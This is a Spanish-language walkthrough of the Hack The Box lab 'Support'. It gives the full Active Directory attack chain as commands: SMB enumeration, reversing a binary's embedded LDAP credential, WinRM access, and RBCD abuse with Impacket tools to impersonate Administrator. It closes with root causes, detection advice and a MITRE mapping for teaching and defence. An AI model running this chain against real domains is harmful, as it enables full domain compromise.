# Hack The Box: Support — Walkthrough en español

- **Autor:** Garbox0
- **Dificultad:** Easy
- **Sistema:** Windows / Active Directory
- **Estado:** Retirada

## Resumen

Support presenta una cadena de ataque centrada en Active Directory:

1. Enumeración anónima de SMB.
2. Descarga y decompilación de una aplicación .NET propia.
3. Recuperación de credenciales LDAP mediante criptografía reversible.
4. Descubrimiento de una segunda contraseña en un atributo LDAP.
5. Acceso remoto como el usuario `support` mediante WinRM.
6. Identificación de `GenericAll` sobre el objeto del controlador de dominio.
7. Abuso de Resource-Based Constrained Delegation (RBCD).
8. Obtención y uso de un ticket Kerberos como `Administrator`.

## 1. Reconocimiento

Comencé con un escaneo completo de puertos TCP:

```bash
nmap -p- --min-rate 2000 -T4 -Pn -oA recon/01-tcp-allports [IP_OBJETIVO]
```

Los servicios más relevantes fueron:

```text
53/tcp    DNS
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password change
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
5985/tcp  WinRM
9389/tcp  Active Directory Web Services
```

La combinación de Kerberos, LDAP, SMB, Global Catalog y ADWS indicaba que el objetivo era un controlador de dominio de Active Directory.

Añadí el dominio a `/etc/hosts`:

```text
[IP_OBJETIVO] support.htb dc.support.htb
```

## 2. Enumeración anónima de SMB

La enumeración sin credenciales devolvió seis recursos compartidos:

```bash
smbclient -L //[IP_OBJETIVO] -N
```

```text
ADMIN$
C$
IPC$
NETLOGON
support-tools
SYSVOL
```

`ADMIN$`, `C$`, `IPC$`, `NETLOGON` y `SYSVOL` son recursos habituales en un controlador de dominio. El recurso personalizado `support-tools` era el que destacaba.

```bash
smbclient //[IP_OBJETIVO]/support-tools -N -c 'ls'
```

La mayoría de los archivos eran herramientas públicas conocidas, como PuTTY, Wireshark, Notepad++ y Sysinternals. La excepción era:

```text
UserInfo.exe.zip
```

Lo descargué para analizarlo localmente:

```bash
smbclient //[IP_OBJETIVO]/support-tools -N \
  -c 'get UserInfo.exe.zip UserInfo.exe.zip'

unzip UserInfo.exe.zip -d UserInfo
file UserInfo/UserInfo.exe
```

`file` identificó `UserInfo.exe` como un ensamblado .NET, por lo que podía decompilarse y recuperar código C# de alto nivel.

## 3. Análisis de `UserInfo.exe`

Una primera revisión con `strings` mostró referencias interesantes:

```bash
strings -a UserInfo/UserInfo.exe |
  rg -i 'ldap|password|enc_password|base64|directoryentry|authentication'
```

Entre los resultados aparecieron `enc_password`, `FromBase64String`, `DirectoryEntry` y `getPassword`. Esto sugería que el ejecutable almacenaba una contraseña reversible para conectarse a LDAP.

Abrí el ensamblado con ILSpy y revisé la clase responsable de proteger la contraseña. El método realizaba tres operaciones:

1. Decodificación Base64.
2. XOR con una clave repetida.
3. XOR adicional con el byte `0xDF`.

La lógica podía reproducirse en Python sin publicar el secreto original:

```python
import base64

encoded = base64.b64decode("[BASE64_REDACTADO]")
key = b"[CLAVE_REDACTADA]"

plain = bytes(
    byte ^ key[index % len(key)] ^ 0xDF
    for index, byte in enumerate(encoded)
)

print(plain.decode())
```

El resultado proporcionó la contraseña de la cuenta LDAP utilizada por la aplicación. La contraseña se omite intencionalmente.

La causa raíz no era Base64 por sí sola, sino almacenar una credencial junto con todo el código necesario para recuperarla. Cualquier persona con acceso al binario podía reproducir el proceso.

## 4. Enumeración LDAP autenticada

Con las credenciales recuperadas consulté el dominio:

```bash
ldapsearch -x -LLL \
  -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -W \
  -b 'DC=support,DC=htb' \
  '(&(objectClass=user)(sAMAccountName=support))' \
  sAMAccountName info memberOf
```

El atributo `info` del usuario `support` contenía una cadena con formato de contraseña. Además, la cuenta pertenecía a:

```text
Shared Support Accounts
Remote Management Users
```

El primer grupo sería importante durante la escalada. El segundo explicaba por qué la cuenta podía iniciar una sesión remota mediante WinRM.

Guardar contraseñas en atributos descriptivos de Active Directory es inseguro: cualquier usuario con permisos de lectura LDAP puede recuperarlas.

## 5. Acceso inicial mediante WinRM

Utilicé el valor del campo `info` como contraseña del usuario `support`:

```bash
evil-winrm -i support.htb -u support
```

La sesión quedó autenticada como:

```text
support\support
```

El primer flag se encontraba en el escritorio del usuario:

```powershell
Get-Content C:\Users\support\Desktop\user.txt
```

La flag no se incluye en este documento.

### Problema de WinRM sobre la VPN

Aunque el puerto `5985` aceptaba conexiones y `/wsman` respondía, Evil-WinRM expiraba al abrir la sesión. El problema era la fragmentación de tráfico dentro del túnel VPN. Reiniciar OpenVPN con un MSS reducido resolvió el bloqueo:

```bash
sudo openvpn --config /ruta/lab.ovpn --mssfix 1000
```

Las pruebas pequeñas con `nc` o `curl` funcionaban porque no reproducían el tamaño del intercambio SOAP/PSRP utilizado por WinRM.

## 6. Relaciones de Active Directory

La relación relevante, visible al analizar el dominio con SharpHound y BloodHound, era:

```text
support
  └── miembro de Shared Support Accounts
        └── GenericAll sobre DC.SUPPORT.HTB
```

`GenericAll` representa control total sobre el objeto de equipo del controlador de dominio. No convierte automáticamente al usuario en administrador, pero permite modificar atributos sensibles del objeto.

Uno de ellos es:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Este atributo controla qué cuentas pueden actuar en nombre de otros usuarios mediante Resource-Based Constrained Delegation.

## 7. Validación de Machine Account Quota

Para ejecutar el ataque necesitaba una cuenta de equipo bajo mi control. Consulté el objeto raíz del dominio:

```bash
ldapsearch -x -LLL \
  -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -W \
  -b 'DC=support,DC=htb' \
  -s base \
  '(objectClass=domain)' \
  ms-DS-MachineAccountQuota
```

El resultado era:

```text
ms-DS-MachineAccountQuota: 10
```

Esto permitía que un usuario autenticado creara hasta diez cuentas de equipo en el dominio.

## 8. Creación de un equipo controlado

Creé una cuenta de máquina llamada `FAKE01$` mediante SAMR:

```bash
addcomputer.py \
  -method SAMR \
  -computer-name 'FAKE01$' \
  -computer-pass '[PASSWORD_FAKE_REDACTADA]' \
  -dc-ip [IP_OBJETIVO] \
  'support.htb/support'
```

La contraseña de `support` se introdujo mediante el prompt del programa para evitar dejarla en el historial de la shell.

El resultado confirmó:

```text
Successfully added machine account FAKE01$
```

Esta cuenta no era privilegiada. Su utilidad era que conocía su contraseña y, por tanto, podía autenticarse como ese principal de máquina.

## 9. Configuración de RBCD

El siguiente paso utilizó `GenericAll` para modificar el objeto `DC$` y autorizar a `FAKE01$` a delegar identidades:

```bash
rbcd.py \
  -delegate-from 'FAKE01$' \
  -delegate-to 'DC$' \
  -action write \
  -dc-ip [IP_OBJETIVO] \
  'support.htb/support'
```

La salida confirmó:

```text
Delegation rights modified successfully
FAKE01$ can now impersonate users on DC$ via S4U2Proxy
```

En términos simples, el controlador de dominio pasó a confiar en `FAKE01$` para solicitar tickets en nombre de otros usuarios.

### Incompatibilidad MD4 en Python 3.14

Inicialmente `rbcd.py` falló con:

```text
unsupported hash type MD4
```

`ldap3` intentaba utilizar MD4 para NTLM, pero el algoritmo no estaba expuesto por la versión de OpenSSL utilizada por Python. La instalación de `pycryptodome` dentro del entorno virtual proporcionó la implementación necesaria:

```bash
pip install pycryptodome
```

## 10. Ticket de servicio como `Administrator`

Con la relación RBCD configurada, solicité un ticket para el servicio CIFS del controlador de dominio impersonando a `Administrator`:

```bash
getST.py \
  -spn 'cifs/dc.support.htb' \
  -impersonate Administrator \
  -dc-ip [IP_OBJETIVO] \
  'support.htb/FAKE01$:[PASSWORD_FAKE_REDACTADA]'
```

`getST.py` realizó dos pasos del protocolo Kerberos:

- **S4U2Self:** `FAKE01$` solicitó un ticket representando a `Administrator`.
- **S4U2Proxy:** utilizó la autorización RBCD para obtener un ticket válido para `cifs/dc.support.htb`.

El ticket se guardó como archivo `.ccache`.

Si el ticket se genera con una herramienta de Windows en formato `.kirbi`, Impacket incluye `ticketConverter.py` para convertirlo:

```bash
ticketConverter.py administrator.kirbi administrator.ccache
```

## 11. Pass the Ticket y acceso administrativo

Kerberos en Linux consulta la variable `KRB5CCNAME` para localizar el archivo de credenciales:

```bash
export KRB5CCNAME=/ruta/Administrator.ccache
```

Utilicé el ticket con `wmiexec.py`:

```bash
wmiexec.py \
  -k -no-pass \
  -target-ip [IP_OBJETIVO] \
  'support.htb/Administrator@dc.support.htb'
```

- `-k` activa autenticación Kerberos.
- `-no-pass` evita solicitar una contraseña porque la autenticación procede del ticket.
- `-target-ip` permite conservar el hostname correcto para el SPN mientras la conexión TCP utiliza la IP indicada.

La comprobación final devolvió:

```text
support\administrator
```

Con esta sesión fue posible leer:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

La flag se omite intencionalmente.

## ¿Por qué funcionó el ataque?

La escalada necesitó cuatro condiciones encadenadas:

1. `support` pertenecía a un grupo con `GenericAll` sobre el objeto `DC$`.
2. `ms-DS-MachineAccountQuota` permitía crear una cuenta de equipo controlada.
3. `GenericAll` permitía escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en el DC.
4. Kerberos aceptó que la cuenta autorizada solicitara un ticket CIFS representando a `Administrator`.

Ninguna contraseña de administrador fue recuperada. El acceso se obtuvo abusando de relaciones de confianza y permisos de Active Directory.

## Cadena de ataque

```text
SMB anónimo
    ↓
UserInfo.exe expuesto
    ↓
Credencial LDAP reversible
    ↓
Contraseña en el atributo LDAP info
    ↓
WinRM como support
    ↓
GenericAll sobre DC$
    ↓
Creación de FAKE01$
    ↓
RBCD + S4U2Self/S4U2Proxy
    ↓
Ticket CIFS como Administrator
    ↓
Pass the Ticket mediante wmiexec
```

## Causas raíz

1. Acceso anónimo a un recurso SMB con software interno.
2. Credenciales recuperables incluidas en una aplicación distribuida.
3. Contraseña almacenada en texto claro dentro del atributo LDAP `info`.
4. Asignación excesiva de `GenericAll` sobre el objeto del controlador de dominio.
5. Cuota de creación de equipos disponible para usuarios autenticados.
6. Falta de monitorización sobre cambios de delegación y creación de cuentas de máquina.

## Recomendaciones

- Restringir `support-tools` a usuarios autorizados y revisar periódicamente su contenido.
- Eliminar credenciales embebidas en binarios y utilizar un gestor de secretos.
- No almacenar contraseñas en atributos descriptivos de Active Directory.
- Aplicar privilegio mínimo sobre objetos de equipo, especialmente controladores de dominio.
- Reducir `ms-DS-MachineAccountQuota` a `0` cuando los usuarios no deban unir equipos al dominio.
- Auditar cambios sobre `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Alertar ante la creación inesperada de cuentas de equipo y solicitudes S4U anómalas.
- Revisar los eventos de seguridad asociados a creación de equipos y modificación de objetos de directorio, como `4741` y `5136`.

## MITRE ATT&CK

| Técnica | ID | Uso en la cadena |
|---|---|---|
| Network Share Discovery | T1135 | Enumeración de recursos SMB |
| Credentials In Files | T1552.001 | Credencial recuperada desde el binario .NET |
| Domain Account Discovery | T1087.002 | Enumeración de usuarios y atributos LDAP |
| Windows Remote Management | T1021.006 | Acceso inicial como `support` |
| Account Manipulation: Device Registration | T1098.005 | Creación de `FAKE01$` |
| Pass the Ticket | T1550.003 | Uso del archivo `.ccache` |
| Windows Management Instrumentation | T1047 | Ejecución remota mediante `wmiexec.py` |

## Pistas que guiaron la resolución

- La presencia conjunta de Kerberos, LDAP, SMB y Global Catalog identificaba un DC.
- `support-tools` era el único recurso SMB no estándar.
- `UserInfo.exe` era el único binario propio entre herramientas públicas.
- `enc_password`, `FromBase64String` y `DirectoryEntry` indicaban credenciales reversibles.
- El campo LDAP `info` destacaba por contener una cadena con apariencia de contraseña.
- `Remote Management Users` justificaba probar WinRM.
- `Shared Support Accounts` conectaba al usuario con el permiso `GenericAll`.
- `ms-DS-MachineAccountQuota: 10` habilitaba el objeto controlado necesario para RBCD.

## Preguntas técnicas de entrevista

1. ¿Por qué Base64 no debe considerarse cifrado?
2. ¿Qué diferencia existe entre conocer una contraseña y disponer de `GenericAll` sobre un objeto de AD?
3. ¿Qué controla `ms-DS-MachineAccountQuota`?
4. ¿En qué objeto se almacena `msDS-AllowedToActOnBehalfOfOtherIdentity` durante RBCD?
5. ¿Cuál es la diferencia entre S4U2Self y S4U2Proxy?
6. ¿Por qué el SPN solicitado fue `cifs/dc.support.htb`?
7. ¿Qué función cumple `KRB5CCNAME` en Linux?
8. ¿Qué eventos permitirían detectar la creación del equipo falso y el cambio de delegación?

## Conclusión

Support demuestra que una cadena de Active Directory puede comenzar con algo aparentemente menor: una herramienta interna en un recurso SMB. El binario reveló acceso LDAP, LDAP reveló una cuenta remota y un permiso excesivo sobre el DC permitió abusar de Kerberos sin conocer la contraseña de un administrador.

La principal lección es que los permisos sobre objetos de Active Directory son tan importantes como la pertenencia a grupos privilegiados. Una cuenta puede no ser administradora y aun así controlar indirectamente el dominio mediante una ACL mal configurada.

## Referencias

- [Hack The Box — Support](https://www.hackthebox.com/machines/support)
- [Impacket](https://github.com/fortra/impacket)
- [Microsoft — Kerberos constrained delegation overview](https://learn.microsoft.com/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [MITRE ATT&CK — Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
